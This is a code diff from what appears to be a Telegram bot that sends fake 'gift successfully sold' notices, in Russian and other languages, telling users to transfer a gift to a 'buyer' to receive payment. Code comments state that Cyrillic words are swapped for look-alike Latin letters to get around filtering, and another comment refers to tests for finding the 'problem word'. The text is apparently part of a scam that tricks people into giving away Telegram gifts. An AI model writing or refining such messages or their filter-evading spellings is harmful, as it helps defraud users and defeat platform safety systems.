@@ -963,7 +963,7 @@ async def handle_text(message: Message, is_business: bool):
     
     # Тест текста после принятия оффера
     if low == "офпринят":
-        await test_send(message, is_business, "🎁 Подарок успешно продан!\n\n• Пeрeдaйтe пoдaрoк пoкупaтeлю, чтoбы пoлучить 100 Gram.")
+        await test_send(message, is_business, "🎁 Подарок успешно продан!\n\n• Пeрeдaйтe дaнный пoдaрoк пoкупaтeлю, для зaчислeния 100 Gram нa вaш бaлaнс.")
         return
     
     # Дополнительные тесты для поиска проблемного слова
@@ -1277,8 +1277,8 @@ async def offer_callback(call: CallbackQuery):
             else:
                 alert_amount_text = f"{offer['amount']:g}₽"
             if offer["locale"] == "ru":
-                # Обходим латинскими буквами: "Пeрeдaйтe" и "пoкупaтeлю"
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Пeрeдaйтe пoдaрoк пoкупaтeлю, чтoбы пoлучить {amount_text}."
+                # Обходим латинскими буквами: "Пeрeдaйтe дaнный пoдaрoк пoкупaтeлю, для зaчислeния ... нa вaш бaлaнс"
+                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Пeрeдaйтe дaнный пoдaрoк пoкупaтeлю, для зaчислeния {amount_text} нa вaш бaлaнс."
             elif offer["locale"] == "cn":
                 final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> 礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
             elif offer["locale"] == "ar":
